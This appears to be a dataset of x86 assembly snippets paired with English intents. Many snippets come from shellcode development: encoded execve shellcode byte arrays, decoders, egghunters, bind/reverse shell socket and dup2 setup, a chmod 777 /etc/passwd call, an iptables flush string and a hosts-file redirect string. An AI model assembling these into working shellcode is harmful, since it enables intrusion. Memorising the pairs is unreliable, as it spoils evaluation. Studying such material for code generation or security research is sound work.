decoder:	declare decoder label
decoder:	declare _decoder label
decoder:	declare _decoderf label
decoder:	define decoder label
decoder:	define decoder_label
decoder:	define _decoder label
decoder:	define _ decoder label
decoder:	define the decoder function
decoder:	decoder function
decoder:	decoder routine
decoder:	declare the label decoder
decoder:	define decoder
decoder:	decoder's main
decoder:	decoder label
decoder:	declare the decoder function
decoder:	define decoder function
decoder:	declare the decoder label
decoder: \n pop esi	define the decoder function and store the encoded shellcode pointer in the esi register
decoder: \n pop esi	in the decoder routine save the shellcode in esi
decoder: \n pop esi \n mov edi, esi	in decoder save the shellcode in esi and move it to edi
decoder1:	define decoder1_label
decoder2:	declare decoder2_label
decrypt:	define _decrypt label
decrypt:	declare the decrypt label
dim: equ 25	declare a constant size and set equal to 25
dim: equ 512	define dim to be 512 bytes large
div dword [value]	divide the contents of eax by the word value stored at memory location value
div dword [var]	divide the contents of in eax by by the word value stored at memory location var
div dword ptr [eax]	divide dx:ax by the double word in eax storing in ax the quotient and in dx the reminder
div ebx	divide eax by ebx
div ebx	divide the contents of eax by the contents of ebx
div ecx	divide eax by ecx
div ecx	divide eax by ecx the result of the division is stored in eax and the remainder in edx
div edx	divide eax by value in edx
div esi	divide eax by esi
do_dup:	declare the do_dup label
do_dup:	define do_dup label
doit:	declare the doit label
done:	define _done label
done:	declare the done label
download:	delcare download_label
download:	declare the download label
download:	define download function
dup2:	declare _dup label
dup2:	declare _dup2 label
dup2:	define dup2 label
dup2:	define _dup2 label
dup2:	declare the dup2 label
dup2:	define dup2 function
dup2loop:	declare _dup2loop label
dup2loop:	delcare the dup2loop label
dupcount:	declare _dopcount label
dupcpunt:	declare _dupcount label
duploop:	define duploop_label
duploop:	declare the duploop label
duploop:	define duploop function
egg equ 'egg '	define egg equal to 'egg '
egg1 equ 'mark'	define egg1 equal to 'mark'
egghunter:	define _egghunter label
egghunter:	declare the egghunter label
enc:	define enc_label
enc:	declare the enc label
enc: \n call decoder	define enc function and call decoder
encoded_shellcode: db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80	encoded_shellcode is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
encoded_shellcode: dw 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539	define encoded_shellcode as array of words 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539
encoded:	define _encoded label
encoded: db 0xaa,0x62,0xc0,0xaa,0xa0,0xaa,0xd0,0xaa,0x5e,0xaa,0x5e,0xaa,0xe6,0xaa,0xd0,0xaa,0xd0,0xaa,0x5e,0xaa,0xc4,0xaa,0xd2,0xaa,0xdc,0x89,0xe3,0xaa,0xa0,0x89,0xe2,0xaa,0xa6,0x89,0xe1,0xb0,0xaa,0x16,0xcd,0x80,0xbb	encoded is the array of bytes 0xaa,0x62,0xc0,0xaa,0xa0,0xaa,0xd0,0xaa,0x5e,0xaa,0x5e,0xaa,0xe6,0xaa,0xd0,0xaa,0xd0,0xaa,0x5e,0xaa,0xc4,0xaa,0xd2,0xaa,0xdc,0x89,0xe3,0xaa,0xa0,0x89,0xe2,0xaa,0xa6,0x89,0xe1,0xb0,0xaa,0x16,0xcd,0x80,0xbb
encoded: dw 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539	define encoded as array of words 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539
encodedshellcode:	define encodedshellcode_label
encodedshellcode: db \xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb	define the array of bytes encodedshellcode and initialize to \xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb
encodedshellcode: db 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce	define the array of bytes encodedshellcode and initialize it to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce
encodedshellcode: db 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce	define the array of bytes encodedshellcode and initialize to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce
encodedshellcode: db 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe	encodedshellcode is the array of bytes 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe
encodedshellcode: db 0x4c,0xbd,0x2d,0x15,0x52,0x52,0x0e,0x15,0x15,0x52,0x1f,0x14,0x13,0xf4,0x9e,0x2d,0xf4,0x9f,0x2e,0xf4,0x9c,0xcd,0x76,0xb0,0xfd	declare _encodedshellcode label and the encoded shellcode: 0x4c,0xbd,0x2d,0x15,0x52,0x52,0x0e,0x15,0x15,0x52,0x1f,0x14,0x13,0xf4,0x9e,0x2d,0xf4,0x9f,0x2e,0xf4,0x9c,0xcd,0x76,0xb0,0xfd
encodedshellcode: db 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3	define _encodedshellcode label declare db 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3
encodedshellcode: db 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3	define the array of bytes encodedshellcode and initialize it to 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3
encodedshellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87	define the array of bytes encodedshellcode and initialize it to 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87
encodedshellcode: db 0xeb,0x0c,0x5e,0x31,0xc9,0xb1,0x19,0xf6,0x16,0x46,0xe2,0xfb,0xeb,0x05,0xe8,0xef,0xff,0xff,0xff,0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f	define the array of bytes encodedshellcode and initialize it to 0xeb,0x0c,0x5e,0x31,0xc9,0xb1,0x19,0xf6,0x16,0x46,0xe2,0xfb,0xeb,0x05,0xe8,0xef,0xff,0xff,0xff,0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f
encoder_shellcode: db 0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa	encoder_shellcode is the array of bytes 0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa
encrypt:	define _encrypt label
encrypt:	declare the encrypt label
end:	define _end label
end:	declare the end label
entrypoint:	define _entrypoint label
entrypoint:	declare the entrypoint label
even_number:	define even_number label
even_number:	define even_number
even_number:	define even_number function
execfile:	declare _execfile label
execfile:	define execfile function
execfile:	declare the execfile label
execute_shellcode: \n jmp short esp	in execute_shellcode jump short to esp
execute:	define _execute label
execute:	declare the execute label
exit_call equ 1	define exit_call =1
exit_call equ 1	define exit_call equal to 1
exit_on_error:	define exit_on_error label
exit_on_error:	declare the exit_on_error label
exit:	define exit_label
exit:	define _exit label
exit:	define exit function
exit:	define the exit label
exit:	declare the exit label
F1: \n call function_1	define F1 and call the function function_1
F1: \n cmp byte [esi], 0x1 \n jl L1 \n sub byte [esi], 0x1 \n jmp L2	in the function F1 jump to label L1 if the current byte of the shellcode is lower than 0x1 else subtract 0x1 from the byte of the shellcode and jump to L2
F1: \n inc esi	in the function F1 point to the next byte in esi
F1: \n inc esi \n inc esi	in the function F1 point to the next word in esi
F1: \n jmp short L1	define F1 function and jump short to L1
F1: \n not cl \n inc cl	in the function F1 negate cl and increment cl to the next byte
F1: \n not cl \n inc cl	define F1, negate cl and increment cl to the next byte
F1: \n not cl \n inc cl	define F1, negate cl and point to the next byte in the cl register
F1: \n pop esi	define the function F1 and store the encoded shellcode pointer in the esi register
F1: \n pop esi	declare the function F1 and save in esi the pointer to the shellcode
F1: \n pop esi	declare the function F1 and point the shellcode in esi
F1: inc edi \n jmp short L1	in the function F1 point to the next byte of the edi and jump short to L1
F2: \n call function_1	define F2 and call the function function_2
F2: \n cmp byte [esi], 0x2 \n jg L1 \n add byte [esi], 0x2 \n jmp L2	in the function F2 jump to label L1 if the current byte of the shellcode is greater than 0x2 else add 0x2 to the byte of the shellcode and jump to L2
F2: \n inc esi	declare F2 and point to the next byte in esi
F2: \n inc esi \n inc esi	declare F2 and point to the next word in esi
F2: \n jmp L3	define F2 function and jump to L3
F2: \n not bl \n inc bl	in the function F2 negate bl and move bl to the next byte
F2: \n not bl \n inc bl	declare F2, negate bl and move bl to the next byte
F2: \n not bl \n inc bl	declare F2, negate bl and point to the next byte in bl
F2: inc eax \n jmp L1	in F2 point to the next byte of the eax register and jump to label L2
F3: \n call function_1	define F3 and call the function function_3
F3: \n cmp byte [esi], 0x3 \n je L1 \n mov byte [esi], 0x3 \n jmp L2	in the routine F3 jump to label L1 if the current byte of the shellcode is equal to 0x3 else move 0x3 into the byte in esi and jump to L2
F3: \n inc edi	declare F3 function and point to the next byte in edi
F3: \n inc edi \n edi	declare F3 function and point to the next word in edi
F3: \n jmp L5	define F3 and jump to L5
F3: \n not al \n inc al	in the function F3 negate al and move al to the next byte
F3: \n not al \n inc al	define the function F3, negate al and move al to the next byte
F3: \n not al \n inc al	define the function F3, negate al and point to the next byte in al
F3: inc ebx \n jmp short L2	define the function F3, move to the next byte of ebx and jump short to L2
F4: \n call function_1	define F4 and call the function function_4
F4: \n cmp byte [esi], 0x1 \n jl L1 \n sub byte [esi], 0x1 \n jmp L2	in the function F4 jump to label L1 if the byte specified by the address in esi is lower than 0x1 else subtract 0x1 from the byte at the address in esi and jump to L2
F4: \n jmp short L5	declare F4 and jump short to F5
F4: \n not dl \n inc dl	in the function F4 negate dl and point to the next byte in the dl register
F4: \n not dl \n inc dl	declare the function F4, negate dl and move dl to the next byte
F4: inc ecx \n jmp L2	declare F4, move to the next byte in ecx and jump to L2
F5: \n call function_1	define F5 and call the function function_5
F5: \n cmp byte [esi], 0x2 \n jg L1 \n add byte [esi], 0x2 \n jmp L2	in the function F5 jump to label L1 if the byte at the address in esi is greater than 0x2 else add 0x2 to the byte at the address in esi and jump to L2
F5: \n jmp L1	declare F5 and jump to L1
F5: inc edx \n jmp short L3	define the function F5, increment edx and jump short to L3
F6: \n cmp byte [esi], 0x3 \n je L1 \n mov byte [esi], 0x3 \n jmp L2	in the routine F6 jump to label L1 if the byte at the address specified by esi is equal to 0x3 else move 0x3 into the byte in esi and jump to L2
file: db '/sbin/iptables#-f'	define file as the byte string '/sbin/iptables#-f'
fileaddress:	define _fileaddress label
fileaddress:	declare the fileaddress label
filecontents: resb 128	reserve filecontents variable of 128 bytes
filename: db 'readme.txt', 0h	create a string filename and initialize to 'readme.txt'
filename: resb 255	reserve a variable filename of 255 bytes
filestoread:	define filestoread_label
fill:	declare the fill label
fill:	define fill label
find_address:	define find_address label
find_egg:	define find_egg label
find_egg:	declare the find_egg label
find_egg:	define find_egg function
fldpi	push pi onto the fpu stack
fldz \n fstenv [esp-0xc] \n pop edi	obtain the address of the first instruction of the shellcode
format:	define format label
format:	define format routine
format:	declare the format label
formatting:	define formatting label
formatting:	formatting label
formatting:	declare the formatting label
four:	define _four label
four:	declare the four label
fstenv [esp-0xc] \n pop esi	obtain the address of the first instruction of the shellcode alias the entry mem addr of this code (_start) and then pop it in esi
function_1: \n call [esp]	define function_1 and execute it
function_2: \n call [esp]	declare function_2 and execute it
function_3: \n call [esp]	declare function_3 and call it
function_4: \n call [esp]	define function_4 and call it
function_5: \n call [esp]	define function_5 and execute it
fupdisasm:	define fupdisasm function
fupdisasm:	define fupdisasm label
fwait	put cpu into a wait state until the coprocessor signals it has finished it’s operation
get_key:	define _get_key label
get_shellcode_addr:	get_shellcode_addr function
get:	declare get_label
get:	declare the get label
global _shell	declare _shell as global label
global _start	declare global start
global _start	define global _start
global _start	declare global _start, section .text, _start label
global _start	declare of the global _start
global _start	global _start
global _start	define the program entry point
global _start	declare _start as global label
global _start	declare global _start
global _start \n _start:	declare global start and _start label
global _start \n _start:	declare global _start and _start label
global _start \n _start:	declare global _start, section .text, _start label
global _start \n section .text \n _start:	declare global start, section .text and _start label
global _start \n section .text \n _start:	declare global start, text section and _start label
global _start \n section .text \n _start:	declare global _start, setion .text, _start
global _start \n section .text \n _start:	declare global _start, section .text, _start label
global _start \n section .text \n _start:	declare global _start, section .text and_start label
global _start \n section .text \n \n _start:	declare global _start, section .text, _start label
global _start \n section .text \n egg_sig equ 0x4f904790 \n _start:	declare global _start, section .text, egg_sign = 0x4f904790 and_start label
global _start \n section .text \n sys_execve equ 0x0b \n _start:	declare global _start, section .text, sys_execve = 0x0b and_start label
global _start:	declare the global _start label
global _start:	global _start
google db '127.1.1.1 google.com'	define google as the byte string '127.1.1.1 google.com'
google: db '127.1.1.1 google.com'	define the byte string google and initialize it to '127.1.1.1 google.com'
gotocall:	define _gotocall label
gotocall:	declare the gotocall label
hello: db 'hello world!',10	create a string 'hello world!' plus a linefeed character
hellolen: equ $-hello	define hellolen equal to the length of the hello string
here:	declare the here label
here:	define here label
hlt	halt cpu until reset line is activated
in al,0x10	read the hexadecimal value 0x10 and place it in al register
inc [count]	increment the count variable
inc al	increment the contents of the al register
inc al \n inc al	increment al register of 2
inc ax	add 1 to ax
inc ax	increment ax
inc ax	increment the contents of the ax register
inc bl	increment bl by 1
inc bl	increment bl register by 1
inc bl	increment the contents of the bl register
inc bl \n inc bl	increase bl by 2 so ebx=2
inc bx	increment bx
inc bx	increment the contents of the bx register
inc byte [esp+ecx]	increment the byte at the address [esp+ecx] by one
inc cl	increase cl of 1
inc cl	increase cl by 1 so ecx = 1
inc cl	increment the contents of the cl register
inc cl \n cmp cx \n jle dupcount	increase cl of 1 until the contents of cx is less than or equal to 2 with sign
inc count	increment the memory variable count
inc cx	increment cx by 1
inc dl	save 0x0a into dl to have bad line feed char
inc dl	increment dl
inc dl	increment dl register
inc dl	increment the contents of the dl register
inc dword [tmp]	add one to the doubleword integer stored at memory location tmp
inc dword [value]	add one to the doubleword integer stored at memory location value
inc dword [var]	add one to the doubleword integer stored at location var
inc dx	increment the contents of the dx register
inc dx	increment dx by one
inc eax	increase eax by 1
inc eax	increment eax by 1
inc eax	incement eax register by 1
inc eax	increase eax content by 1
inc eax	increment eax content by 1
inc eax	increment eax
inc eax	increment the address in eax by one byte
inc eax	point to the next byte in eax
inc eax	point to the next byte in the eax register
inc eax	increment the contents of the eax register
inc eax \n cmp dword [eax], ebx \n jne next_addr \n jmp eax	go to next memory address increasing eax, then check if the egg is at that memory address. if yes set zf = 1 and go to eax. else zf = 0 and go to next_addr label
inc eax \n inc eax	point to the next word in the eax register
inc eax \n inc eax	move to the next word in eax
inc eax \n inc eax \n inc eax \n inc eax	point to the next double word in eax
inc eax \n inc eax \n inc eax \n inc eax	move to the next double word in the eax register
inc eax \n inc esi \n inc edi	increment eax, esi and edi by 1
inc eax \n int 0x80	load __nr_exit into eax register and call kernel
inc eax \n int 0x80	execute exit syscall
inc eax \n int 0x80	execute waitpid syscall
inc ebx	increment ebx by 1
inc ebx	increment ebx content by 1
inc ebx	define sys_socket 1
inc ebx	increment ebx content defining sys_socket =1
inc ebx	define sys_socket by increasing ebx by 1
inc ebx	increment ebx content defining sys_bind = 2
inc ebx	increment ebx content deining the argument sys_acccept = 5
inc ebx	increment ebx content then push it on stack
inc ebx	increment ebx by 1. ebx = sys_socket = 1.
inc ebx	increment ebx content
inc ebx	inc-rement ebx by 1
inc ebx	ebx(5) = sys_accept = accept()
inc ebx	set connect = 3
inc ebx	add 1 to ebx
inc ebx	fix egg signature in ebx adding 1
inc ebx	load bind =2 into ebx register
inc ebx	increment ebx register
inc ebx	increment the contents of the ebx register
inc ebx	increment ebx
inc ebx	point to the next byte in the ebx register
inc ebx \n inc ebx	increment ebx content two times
inc ebx \n inc ebx	increment ebx two times defining sys_listen = 4
inc ebx \n inc ebx	point to the next word in the ebx register
inc ebx \n inc ebx	move to the next word in the ebx register
inc ebx \n inc ebx \n inc ebx \n inc ebx	point to the next double word in ebx
inc ebx \n inc ebx \n inc ebx \n inc ebx	move to the next double word in the ebx register
inc ebx \n push bx	increment ebx content and push it on stack
inc ebx \n push ebx	increment ebx content and puh it on the stack
inc ebx \n push ebx	increment ebx content then push it on stack
inc ebx \n push ebx	push 1 on stack
inc ecx	go to next address
inc ecx	increment ecx
inc ecx	increment ecx content by 1
inc ecx	increment ecx to 1
inc ecx	increment ecx by 1
inc ecx	increment ecx content
inc ecx	point to the next position in ecx
inc ecx	point to the next byte in ecx
inc ecx	next instruction in the ecx register
inc ecx	increment the contents of the ecx register
inc ecx \n inc ecx	point to the next word in the ecx
inc ecx \n inc ecx	move to the next word in the ecx
inc ecx \n inc ecx \n inc ecx \n inc ecx	point to the next double word in ecx
inc ecx \n inc ecx \n inc ecx \n inc ecx	move to the next double word in the ecx register
inc edi	increments edi by 1
inc edi	increment edi register by 1
inc edi	increment edi content
inc edi	increment edi register
inc edi	inrement edi register
inc edi	increment the contents of the edi register
inc edi	point to the next byte in edi
inc edi	increment edi
inc edi \n add al,0x2	increment edi register
inc edi \n inc cl	increase edi and cl contents of 1
inc edx	increment edx register by 1
inc edx	increment edx register
inc edx	increment edx register by1
inc edx	increment edx
inc edx	point to the next byte in edx
inc edx	point to the next byte in the edx register
inc edx	increment the contents of the edx register
inc edx \n inc edx	next word in the edx
inc edx \n inc edx \n inc edx \n inc edx	point to the next double word in edx
inc edx \n inc edx \n inc edx \n inc edx	move to the next double word in the edx register
inc edx \n inc edx \n inc edx \n inc edx \n inc edx \n inc edx \n inc edx \n inc edx	increment edx by 1 for 8 times
inc edx \n push edx	push sock_stream = 1
inc edx \n push edx	push af_inet = 2
inc edx \n push edx	increment edx and push sock_stream = 1 on stack
inc edx \n push edx	increment edx and push af_inet = 2 on stack
inc esi	increase esi of 1
inc esi	increment esi content
inc esi	incremenet esi content
inc esi	increment the offset (esi content)
inc esi	esi point to next istruction in the encoded shellcode
inc esi	move to the next byte increasing esi by 1
inc esi	increment esi
inc esi	point to the next byte in esi
inc esi	next byte in the encoded shellcode
inc esi	point to the next byte of the shellcode
inc esi	move to next byte in esi
inc esi	point to the next byte of the encoded shellcode
inc esi	increment to the next byte of the shellcode
inc esi	increment the contents of the esi register
inc esi \n inc edi	increment esi and edi register
inc esi \n inc esi	increment esi content two times
inc esi \n inc esi	point to the next encoded_shellcode word
inc esi \n inc esi	point to the next word in esi
inc esi \n inc esi	point to the next word of the encoded shellcode
inc esi \n inc esi	point to the next word of the shellcode
inc esi \n inc esi	next word of the shellcode
inc esi \n inc esi	move to the next word of the encoded shellcode
inc esi \n inc esi	move to the next word of the shellcode
inc esi \n inc esi \n inc edi	increment esi two times and edi once
inc esi \n inc esi \n inc esi	increment esi three times
inc esi \n jmp L1	point to the next byte of the shellcode and jump to label L2
inc esi \n jmp L2	move to the next byte in the shellcode and jump to L2
inc esi \n jmp short decode	point to the next byte of the shellcode and jump short to decode
inc esi \n jmp short L1	point to the next byte of the shellcode and jump short to L1
inc esi \n jmp short L2	move to the next byte in the shellcode and jump short to L2
inc esp	increment esp content
inc esp	increment the contents of the esp register
inc_dec:	define inc_dec label
inc_dec:	declare inc_dec function
inc_dec:	define inc_dec
incaddr:	declare _incaddr label
incaddr:	declare the incaddr label
incpage:	declare _incpage label
incpage:	declare incpage function
infinite:	define _infinite label
init:	declare _init label
init:	declare the init label
insertion_decoder:	define insertion_decoder label
int 0x80	call kernel
int 0x80	call sigaction() to check memory location [ecx]
int 0x80	execute execve syscall
int 0x80	execute exit syscall
int 0x80	executing the reboot syscall
int 0x80	send an interrupt software
int 0x80	execute
int 0x80	call socket()
int 0x80	call kernel / run connect syscall
int 0x80	execute the function chmod 777 /etc/passwd
int 0x80	call chmod syscall
int 0x80	call kernl
int 0x80	syscall execute
int 0x80	make syscall
int 0x80	executing syscall
int 0x80	call kerel
int 0x80	calling interrupt for sys call
int 0x80	exec sys_dup2
int 0x80	ping kernel
int 0x80	cal kernel
int 0x80	ccall kernel
int 0x80	execute execve
int 0x80	execute chmod
int 0x80	execute exit
int 0x80	execute open
int 0x80	c all kernel
int 0x80	call kerenl
int 0x80	init
int 0x80	call socketcall()
int 0x80	socket()
int 0x80	execute the syscall socketcall
int 0x80	execute the syscall
int 0x80	execute the dup2 syscall
int 0x80	xecute the dup2 syscall
int 0x80	execute the system call
int 0x80	syscall execve
int 0x80	call socketcall
int 0x80	execute the reboot syscall
int 0x80	make the system call
int 0x80	system call interrupt
int 0x80	system call interrupt 0x80
int 0x80	execute execve with system call interrupt
int 0x80	make the kernel call
int 0x80	make the system call to the kernel
int 3	set a breakpoint
int 80h	call kernel
int 80h	call kernel (exit(0))
int 80h	call sys_read
int 80h	call sys_read to fill the buffer
int 80h	call sys_write
int 80h	call the kernel
int 80h	make kernel call to display line string
int 80h	make kernel call to exit program
int 80h	make sys_exit kernel call
int 80h	make sys_write kernel call
int 80h	make syscall to output the text to stdout
int 80h	make syscall to terminate the program
int 80h	make the syscall to terminate the program
int 80h	make the system calls to the kernel
into	if the overflow flag is set, genete an int 4
ja exi	jump to exi if greater
ja exit	jump to the exit label if the destination operand is greater than the source operand in the above comparison
ja next	jump to next label if the destination is greater than the source in the above comparison
ja write	jump to write if greater
jae _start-0x24	jump at the adress _start-0x24 if the carry flag is clear
jb _end+0x1d	if the carry flag or the zero flag are set set go to the adress at _end+0x1d
jb 0xf3	perform an unsigned comparison and jump to 0xf3 if lower
jb modtest	jump to label modtest if below
jb next	jump to label next if below
jb write	jump to label write if below
jbe __bss_start+0x12	if the carry flag or the zero flag are set go to __bss_start+0x12
jbe __bss_start+0x16	if the carry flag or the zero flag are set go to __bss_start+0x16
jbe __bss_start+0x1a	if the carry flag or the zero flag are set go to __bss_start+0x1a
jbe done	jump to label done if below or equal
je all	jump to the all label if the operands of the above comparison are equals
je connec	jump to connect if equal
je connect	jump to the connect label if the operands of the above comparison are equals
je continue	if equal jump to label continue
je continue	jump to label continue if equal
je done	jump to label done if equal
je even_number	define odd_number label
je even_number	jump to even_numer if greater
je exit	jump to label exit if equal to 0
je exit	jump to the exit label if the operands of the above comparison are equals
je l7	if equal then jump to label l7
je short encodedshellcode	jump short to encodedshellcode if equal
je short loc_402b13	jump to loc_402b13 if equal
je stop	jump to label stop if equal
jeq loop	jump to the code location labeled loop if the operands of the previous comparison are equal
jg encoded+0x18	if the zero flag is clear or the sign flag equals the overflow flag go to the adress at encoded+0x18
jg finished	jump if greater than to label finished
jge encoded+0x20	if the sign flag equals the overflow flag go to encoded+0x20 label
jl _while_loop	jump to the _while_loop if lower
jl _while_loop	jump to the _while_loop label if the destination operand is less than the source operand in the above comparison
jl finished	jump if less than to label finished
jl wrap_around	jump to the wrap_around label if the destination operand is less than the source operand in the above comparison
jle lp1	if it is less than or equal to 10 then jump to lp1
jmp _accept	jump to label _accept
jmp _read	jump to _read
jmp _return	jump to the _return label
jmp _star	jump to _star
jmp _start	jump to the _start label
jmp _while_loop	jump to the _while_loop label
jmp aslr_file	go to aslr_file label
jmp aslr_file	jump to the aslr_file label
jmp begin	jump to the instruction labeled begin
jmp call_decoder	perform un unconditional jumo to call_decoder label
jmp call_decoder	perform an unconditional jump to call_decoder
jmp call_decoder	perform an unconditional jump to _call_decoder label
jmp call_egghunter	go to call_egghunter label
jmp call_egghunter	jump to the call_egghunter label
jmp call_shellcode	perform an unconditional jump to _call_shellcode label
jmp callpop	go to _callpop label
jmp callpop	jump to callpop
jmp callpop	jump to the callpop label
jmp callz	jump to the callz label
jmp carryon	jump to the carryon label
jmp connec	jump to connec
jmp connect	go to _connect label
jmp data	jump to the data label
jmp decode	go to _decode label
jmp decode	jump to decode
jmp eax	jump to eax content
